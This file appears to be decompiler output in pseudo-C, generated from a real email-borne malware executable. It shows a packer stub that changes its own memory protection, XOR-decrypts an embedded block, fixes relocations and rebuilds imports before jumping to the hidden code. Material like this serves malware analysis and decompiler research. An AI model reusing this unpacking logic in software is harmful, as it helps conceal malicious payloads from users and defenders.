// subject.c
// Generated on 5/4/2015 1:08:31 AM by decompiling malware_via_email/malware_0446/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

void fn00401000(word32 eax, word32 ecx, word32 edx, word32 ebx)
{
fn00401000_entry:
l00401000:
	call SHLWAPI.dll!StrChrA (retsize: 4; depth: 28)
	word32 esi_100 = 0x00000000
	branch eax == 0x00000000 l0040101D
l00401016:
	return
l0040101D:
	word32 eax_39 = GetProcAddress(LoadLibraryA(0x00404074), 0x0040406C)
	call eax_39 (retsize: 4; depth: 60)
	word32 edi_335 = eax_39 + 0x0000001C
	branch AreAllAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) != 0x00000000 l0040105C
l00401059:
	edi_335 = eax_39 + 0x0000001C ^ 0x0000000E
l0040105C:
	Mem74[fp - 0x0000003C:word32] = fp - 0x00000028
	Mem76[fp - 0x00000040:word32] = 0x00000040
	VirtualProtect(0x00401000, 0x00003000, 0xFFFFFFFF, 0xFFFFFFFF)
	word32 eax_134 = 0x00000000
l00401078:
	branch esi_100 != edi_335 l0040107E
l0040107C:
	esi_100 = 0x00000000
l0040107E:
	Mem108[eax_134 + 0x00402618:byte] = Mem76[esi_100 + 0x00405000:byte] ^ Mem76[eax_134 + 0x00402618:byte] ^ 0xFE
	word32 esi_103 = esi_100 + 0x00000001
	branch esi_103 != edi_335 l0040109C
l0040109A:
	esi_103 = 0x00000000
l0040109C:
	Mem118[eax_134 + 0x00402619:byte] = Mem108[esi_103 + 0x00405000:byte] ^ Mem108[eax_134 + 0x00402619:byte] ^ 0xFE
	word32 esi_114 = esi_103 + 0x00000001
	branch esi_114 != edi_335 l004010BA
l004010B8:
	esi_114 = 0x00000000
l004010BA:
	Mem129[eax_134 + 0x0040261A:byte] = Mem118[esi_114 + 0x00405000:byte] ^ Mem118[eax_134 + 0x0040261A:byte] ^ 0xFE
	word32 esi_124 = esi_114 + 0x00000001
	branch esi_124 != edi_335 l004010D8
l004010D6:
	esi_124 = 0x00000000
l004010D8:
	eax_134 = eax_134 + 0x00000004
	Mem137[eax_134 + 0x00402617:byte] = Mem129[esi_124 + 0x00405000:byte] ^ Mem129[eax_134 + 0x0040261B:byte] ^ 0xFE
	esi_100 = esi_124 + 0x00000001
	branch eax_134 <u 0x00001420 l00401078
l004010FE:
	word32 edi_142 = 0x004038F8
	word32 ebx_144 = 0x00000000
	word32 dwLoc24_148 = 0x00000000
l00401120:
	word32 eax_156 = Mem137[edi_142 + 0x00000004:word32]
	word32 ecx_162 = edi_142 + 0x00000008
	branch eax_156 - 0x00000008 >>u 0x00000001 <= 0x00000000 l0040115B
l0040112F:
	word32 esi_297 = eax_156 - 0x00000008 >>u 0x00000001
l00401131:
	branch (Mem137[ecx_162 + 0x00000000:word16] & 0xF000) != 0x3000 l0040114F
l0040113E:
	word32 eax_318 = ((word32) Mem137[ecx_162 + 0x00000000:word16] & 0x00000FFF) + Mem137[edi_142 + 0x00000000:word32]
	Mem321[eax_318 + 0x00402398:word32] = Mem137[eax_318 + 0x00402398:word32] + 0xF0402398
l0040114F:
	ecx_162 = ecx_162 + 0x00000002
	esi_297 = esi_297 - 0x00000001
	branch esi_297 != 0x00000000 l00401131
l00401157:
	ebx_144 = dwLoc24_148
l0040115B:
	ebx_144 = ebx_144 + Mem137[edi_142 + 0x00000004:word32]
	dwLoc24_148 = ebx_144
	edi_142 = edi_142 + Mem137[edi_142 + 0x00000004:word32]
	branch ebx_144 <u 0x000000E4 l00401120
l00401170:
	word32 ebx_177 = 0x004030F4
	word32 dwLoc20_178 = 0x004030F4
	ebx_202 = ebx_177
	branch Mem137[0x00403104:word32] == 0x00000000 l004011F5
l00401183:
	word32 ebx_202
	word32 eax_210 = LoadLibraryA(Mem137[ebx_202 + 0x0000000C:word32] + 0x00402398)
	branch eax_210 == 0x00000000 l004011E8
l00401197:
	word32 edi_236 = Mem137[ebx_202 + 0x00000000:word32]
	branch edi_236 != 0x00000000 l004011A0
l0040119D:
	edi_236 = Mem137[ebx_202 + 0x00000010:word32]
l004011A0:
	word32 edi_241 = edi_236 + 0x00402398
	word32 esi_245 = Mem137[ebx_202 + 0x00000010:word32] + 0x00402398
	branch Mem137[edi_241 + 0x00000000:word32] == 0x00000000 l004011E8
l004011AF:
l004011B0:
	word32 dwLoc3C_271
	word32 dwLoc40_266
	word32 eax_261 = Mem137[edi_241 + 0x00000000:word32]
	word16 ax_262 = (word16) eax_261
	branch eax_261 >= 0x00000000 l004011C4
l004011B9:
	dwLoc3C_271 = (word32) ax_262
	dwLoc40_266 = eax_210
	goto l004011CE
l004011C4:
	dwLoc3C_271 = eax_261 + 0x0040239A
	dwLoc40_266 = eax_210
l004011CE:
	Mem274[esi_245 + 0x00000000:word32] = GetProcAddress(dwLoc40_266, dwLoc3C_271)
	edi_241 = edi_241 + 0x00000004
	esi_245 = esi_245 + 0x00000004
	branch Mem274[edi_241 + 0x00000000:word32] != 0x00000000 l004011B0
l004011E4:
	ebx_202 = dwLoc20_178
l004011E8:
	ebx_202 = ebx_202 + 0x00000014
	dwLoc20_178 = ebx_202
	branch Mem137[ebx_202 + 0x00000010:word32] != 0x00000000 l00401183
l004011F5:
	call 0x00402DE8 (retsize: 4; depth: 60)
	ExitProcess(0x00000000)
	int3()
fn00401000_exit:
}

